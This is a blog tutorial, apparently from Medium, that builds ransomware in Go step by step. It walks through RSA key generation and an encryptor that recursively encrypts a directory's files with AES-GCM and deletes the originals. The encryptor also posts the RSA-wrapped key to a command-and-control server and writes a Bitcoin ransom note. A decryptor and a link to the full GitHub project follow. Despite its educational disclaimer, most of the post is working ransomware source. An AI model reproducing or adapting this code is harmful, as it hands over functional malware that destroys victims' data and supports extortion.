---
layout: post
title: "Building Ransomware in Go: Encryption and Decryption Explained"
date: 2025-08-26
categories: [Red Team,Ransomware,Malware Analysis,Malware Development,Blue Team,Go Programming,Cyber Security]
image: https://cdn-images-1.medium.com/max/800/1*RHfozHW6m56KChyrSsc49g.jpeg
---

#### Introduction

Ransomware has become one of the most devastating cyber threats, crippling businesses, government agencies, and individuals worldwide. These attacks leverage **strong encryption** to lock victims out of their own data, demanding ransom payments — often in cryptocurrency — to restore access. High-profile ransomware groups like **LockBit, Conti, and BlackCat** have demonstrated how effective and financially lucrative these attacks can be.

**Disclaimer:** This project is for **educational and research purposes only**. The goal is to **help security professionals understand ransomware mechanics**, so they can develop **stronger defense strategies**. Any misuse of this knowledge for **malicious purposes is illegal and strictly discouraged**.

In this article, we will build a ransomware simulation in **Go**.

By implementing this project, you will gain deep insights into the encryption techniques used in real-world ransomware, the role of public-key cryptography in securing encryption keys, and how attackers protect their payloads from easy decryption.

#### Project Breakdown

1. **Encryption Script (Go):** Scans a target directory, encrypts all files using **AES-GCM**, and replaces them with their encrypted versions.
2. **Key Exchange Mechanism:** The AES encryption key is encrypted using an **RSA public key** and sent to a remote **C2 server**, ensuring that decryption is impossible without the corresponding **RSA private key**.
3. **Decryption Script (Go):** Uses the **RSA private key** to decrypt the AES key, then decrypts the files back to their original state.
4. **Generating RSA Key Pairs:** Creating a public-private key pair using **Go’s crypto package**, which will be used to secure the AES key transmission.

We are beginning with the script that generates RSA key pairs.

#### 1. Purpose of the Code

- Generates an **RSA key pair** (private &amp; public key).
- Saves the **private key** as `private.pem` in **PEM format**.
- Extracts the **public key** and saves it as `public.pem` in **PEM format**.

#### 2. How the Code Works:

**Step 1:** Generate the RSA Private Key

- The function `generateRSAKeys(bits int)` creates an **RSA private key** using `rsa.GenerateKey()`.
- The `bits` parameter determines the strength of the RSA key (2048 bits is commonly used).

```
privateKey, err := rsa.GenerateKey(rand.Reader, bits)
if err != nil {
    return err
}
```

This step ensures that we have a strong **private key**.

**Step 2**: Save the Private Key to `private.pem`

- The private key is saved in **PEM format**, which is commonly used for cryptographic keys.
- The function `x509.MarshalPKCS1PrivateKey()` encodes the key in **PKCS#1 format**.

```
privateKeyPEM := pem.EncodeToMemory(&pem.Block{
    Type:  "RSA PRIVATE KEY",
    Bytes: x509.MarshalPKCS1PrivateKey(privateKey),
})
```

- The private key is then written to a file (`private.pem`)

```
privateKeyFile, err := os.Create("private.pem")
if err != nil {
    return err
}
defer privateKeyFile.Close()
```

```
_, err = privateKeyFile.Write(privateKeyPEM)
```

The private key is now securely stored in `private.pem`.

**Step 3:** Extract the Public Key

- The public key is extracted from the private key:

```
publicKey := &privateKey.PublicKey
```

This ensures that the public key is derived from the generated private key.

**Step 4:** Save the Public Key to `public.pem`

- The public key is **converted to X.509 format** using `x509.MarshalPKIXPublicKey()`.

```
publicKeyBytes, err := x509.MarshalPKIXPublicKey(publicKey)
if err != nil {
    return err
}
```

- It is then **saved in PEM format**.

```
publicKeyPEM := pem.EncodeToMemory(&pem.Block{
    Type:  "RSA PUBLIC KEY",
    Bytes: publicKeyBytes,
})
```

- Finally, the public key is written to a file (`public.pem`).

```
publicKeyFile, err := os.Create("public.pem")
if err != nil {
    return err
}
defer publicKeyFile.Close()
```

```
_, err = publicKeyFile.Write(publicKeyPEM)
```

The public key is now securely stored in `public.pem`.

Our public and private keys are now ready for usage in encryption and decryption.

* * *

Let’s go code our encryptor.

The idea of the code can be divided into:

1\. Encrypting files with **AES-GCM**  
2\. Using **RSA encryption** to protect the AES key  
3\. Sending the **AES key to a remote C2 server**  
4\. **Deleting original files** after encryption  
5\. Dropping a **ransom note**

#### 1. AES Key Generation

The script first generates a **random 32-byte AES key**, which will be used for encrypting files.

```
func generateAESKey() ([]byte, error) {
	key := make([]byte, 32) // 256-bit AES key
	_, err := rand.Read(key) // Read cryptographically secure random bytes
	if err != nil {
		return nil, err
	}
	return key, nil
}
```

- The `rand.Read()` function ensures **strong randomness**, making the encryption key unpredictable.
- The key will later be **used for AES encryption** of the victim’s files.

#### 2. RSA Encryption for Key Transmission

Since symmetric encryption (AES) requires both encryption and decryption with the **same key**, real-world ransomware needs a way to **securely transmit** this key to the attacker.

### Encrypting the AES Key with RSA

```
func encryptAESKeyWithRSA(aesKey []byte) ([]byte, error) {
	block, _ := pem.Decode([]byte(publicKeyPEM)) // Decode PEM format
	if block == nil {
		return nil, fmt.Errorf("failed to parse RSA public key")
	}
  pubKey, err := x509.ParsePKIXPublicKey(block.Bytes)
   if err != nil {
    return nil, err
   }
   rsaPubKey, ok := pubKey.(*rsa.PublicKey)
   if !ok {
    return nil, fmt.Errorf("failed to cast to RSA public key")
   }
 // Encrypt AES key using RSA-OAEP (Optimal Asymmetric Encryption Padding)
   label := []byte("") // Label for OAEP padding (can be empty)
   hash := sha256.New()
   encryptedKey, err := rsa.EncryptOAEP(hash, rand.Reader, rsaPubKey, aesKey, label)
   if err != nil {
    return nil, err
   }
   return encryptedKey, nil
  }
```

. The **AES key is encrypted with RSA** using **OAEP padding with SHA-256**.

- The **RSA public key** is extracted and parsed from PEM format.
- `rsa.EncryptOAEP()`securely encrypts the AES key, ensuring that only the attacker with the RSA private ke**y** can decrypt it.

#### 3. Sending the Encrypted Key to the C2 Server

Once the AES key is encrypted, it is sent to the **attacker’s Command &amp; Control (C2) server**.

```
func sendKeyToC2(encryptedKey []byte) error {
	c2URL := "<C2 Server>" // C2 server address
        // Convert encrypted key to Base64 format
       encodedKey := base64.StdEncoding.EncodeToString(encryptedKey)
 // Send the key via an HTTP POST request
       _, err := http.Post(c2URL, "application/octet-stream", bytes.NewBufferString(encodedKey))
        return err
  }
```

- The **encrypted AES key** is converted to **Base64** for easier transmission.
- The attacker can now **retrieve the AES key** and decrypt files later if the ransom is paid.

#### 4. AES-GCM File Encryption

Each file is encrypted using **AES-GCM (Galois Counter Mode)**, which is a secure mode of AES encryption that provides **both confidentiality and** integrity.

```
func encryptFile(path string, aesKey []byte) error {
	data, err := os.ReadFile(path) // Read the file content
	if err != nil {
		return err
	}
        // Create AES cipher block
     block, err := aes.NewCipher(aesKey)
     if err != nil {
      return err
     }
     gcm, err := cipher.NewGCM(block) // Use GCM mode
     if err != nil {
      return err
     }
 // Generate a random nonce (needed for GCM mode)
     nonce := make([]byte, gcm.NonceSize())
   if _, err := io.ReadFull(rand.Reader, nonce); err != nil {
      return err
 }
 // Encrypt the file content
     ciphertext := gcm.Seal(nonce, nonce, data, nil)
 // Save the encrypted data to a new file
     encPath := path + ".enc"
     err = os.WriteFile(encPath, ciphertext, 0666)
     if err != nil {
      return err
 }
 // Delete the original file
     return os.Remove(path)
}
```

- The **file is read into memory**.
- A **256-bit AES cipher** is created.
- **AES-GCM encryption** is performed, and a **random nonce** is generated.
- The **nonce is prepended to the ciphertext**, so it can be used during decryption.
- The **encrypted file is saved** with the **“.enc”** extension.
- The **original file is deleted**.

#### 5. Encrypting an Entire Directory

Instead of encrypting just one file, the script **scans an entire directory** and encrypts all files within it.

```
func encryptDirectory(dir string, aesKey []byte) {
	_ = filepath.Walk(dir, func(path string, info os.FileInfo, err error) error {
		if err == nil && !info.IsDir() {
			fmt.Println("Encrypting:", path)
			encryptFile(path, aesKey)
		}
		return nil
	})
}
```

- The function **recursively goes through all files** in the given directory.
- Each file is **encrypted individually**.

#### 6. Dropping the Ransom Note

To inform the victim that their files have been encrypted, the script **drops a ransom note** in the directory.

```
func dropRansomNote(dir string) {
	note := `YOUR FILES HAVE BEEN ENCRYPTED.
To recover them, send Bitcoin and contact us.`
	_ = os.WriteFile(filepath.Join(dir, "README_RECOVER.txt"), []byte(note), 0666)
}
```

- The ransom note is written as a text file (`README_RECOVER.txt`).
- It instructs the victim to send Bitcoin and contact the attacker.

The encoder is now finished, therefore let us move on to the decoder to unlock the files.

* * *

The idea of the code can be divided into:

**Retrieve the Encrypted AES Key**:

- Read the AES key from `key.txt` (Base64 encoded).
- Decode it to get the encrypted AES key.

**Decrypt the AES Key Using RSA**:

- Use the RSA private key to decrypt the AES key.

**Find and Process** `.enc` **Files**:

- Scan the target directory (`./testFiles`).
- Identify all files with the `.enc` extension.

**Decrypt Each** `.enc` **File Using AES-GCM**:

- Extract the **nonce** from the encrypted file.
- Use AES-GCM mode to decrypt the file.
- Write the decrypted content to a new file (original filename).
- Delete the `.enc` file after successful decryption.

#### Purpose of the Code

- The script **decrypts files** that have the `.enc` extension inside a given directory.
- The files were originally encrypted using AES-GCM (Authenticated Encryption).
- The AES encryption key itself was encrypted using an RSA **public key** during encryption.
- To decrypt the AES key, this script uses an RSA **private key**.
- Once the AES key is recovered, the script **decrypts** each `.enc` file and restores the original content.

#### How the Code Works (Step-by-Step)

**Step 1:** Load the Encrypted AES Key

- The script reads an encrypted AES key from a file (`key.txt`).
- The AES key is stored in Base64 format, so it must be decoded.

```
encryptedKeyBase64, err := readKeyFromFile("key.txt")
if err != nil {
    log.Fatal("Failed to read key:", err)
}
encryptedKey, _ := base64.StdEncoding.DecodeString(string(encryptedKeyBase64))
```

This step ensures that we retrieve the AES key, which was encrypted using RSA.

**Step 2:** Decrypt the AES Key Using RSA

- The script uses the **RSA private key** (hardcoded in `privateKeyPEM`) to decrypt the AES key.

```
aesKey, err := decryptAESKeyWithRSA(encryptedKey)
if err != nil {
    panic("Failed to decrypt AES key")
}
```

- Inside `decryptAESKeyWithRSA()`, the function:
- Loads the **RSA private key** from a PEM-encoded string.
- Parses the private key using `x509.ParsePKCS1PrivateKey()`.
- Decrypts the AES key using `rsa.DecryptOAEP()`.

```
block, _ := pem.Decode([]byte(privateKeyPEM))
if block == nil {
    return nil, fmt.Errorf("failed to parse RSA private key")
}
privKey, err := x509.ParsePKCS1PrivateKey(block.Bytes)
if err != nil {
    return nil, err
}
hash := sha256.New()
decryptedKey, err := rsa.DecryptOAEP(hash, nil, privKey, encryptedKey, nil)
```

At this point, the AES key is decrypted and can be used to decrypt the files.

* * *

**Step 3:** Decrypt the `.enc` Files

- The script **walks through a directory** (`./testFiles`) to find all `.enc` files.
- It calls `decryptFile()` for each `.enc` file.

```
decryptDirectory("./testFiles", aesKey)
```

Inside `decryptDirectory()`, the script:

- **Iterates over all files** in the directory.
- If a file **ends with** `.enc`, it calls `decryptFile()`.

```
filepath.Walk(dir, func(path string, info os.FileInfo, err error) error {
    if err == nil && !info.IsDir() && filepath.Ext(path) == ".enc" {
        fmt.Println("Decrypting:", path)
        decryptFile(path, aesKey)
    }
    return nil
})
```

This ensures all encrypted files in `./testFiles` are found and processed.

#### Step 4: Decrypt Each File Using AES-GCM

- The script reads the encrypted file.
- It extracts the **nonce** (used for AES-GCM).
- It decrypts the content using AES-GCM.
- It writes the **decrypted** content back to a new file (removing`.enc` from the filename).

```
data, err := os.ReadFile(path)  // Read encrypted file
block, err := aes.NewCipher(aesKey)  // Initialize AES cipher
gcm, err := cipher.NewGCM(block)  // Initialize GCM mode
nonceSize := gcm.NonceSize()  // Get nonce size
nonce, ciphertext := data[:nonceSize], data[nonceSize:]  // Extract nonce and ciphertext
plaintext, err := gcm.Open(nil, nonce, ciphertext, nil)  // Decrypt
err = os.WriteFile(path[:len(path)-4], plaintext, 0666)  // Save decrypted file
if err == nil {
    os.Remove(path)  // Delete the encrypted file
}
```

Now the original, decrypted file is restored, and the encrypted `.enc` file is deleted.

* * *

### Conclusion

In this article, we explored the **design and implementation of a ransomware project** built using Go, focusing on how it encrypts and decrypts files securely using **RSA and AES encryption**. We started by generating a strong **RSA key pair**, using the public key to encrypt the AES key, ensuring only the private key could decrypt it. We then implemented file encryption and decryption, demonstrating how ransomware operates by locking files and demanding a decryption process.

Through this project, we gained insight into real-world encryption techniques, including hybrid cryptography, where AES efficiently encrypts large files while RSA securely protects the encryption keys. This structure mirrors the behavior of modern ransomware, highlighting the importance of **cybersecurity awareness** and the necessity of strong defenses against such attacks.

It is crucial to emphasize that this project is strictly for **educational and ethical purposes**. Understanding how ransomware functions allows cybersecurity professionals to develop better defensive strategies, threat detection techniques, and countermeasures to combat malicious attacks.

Here is the link for the project on GitHub:

[https://github.com/Moataz51201/Ransom-GO](https://github.com/Moataz51201/Ransom-GO)

**Stay ethical, stay secure!**

By [Moataz Osama](https://medium.com/@mezo512) on [April 4, 2025](https://medium.com/p/7e4b4921a9db).

[Canonical link](https://medium.com/@mezo512/building-ransomware-in-go-encryption-decryption-explained-7e4b4921a9db)

Exported from [Medium](https://medium.com) on August 26, 2025.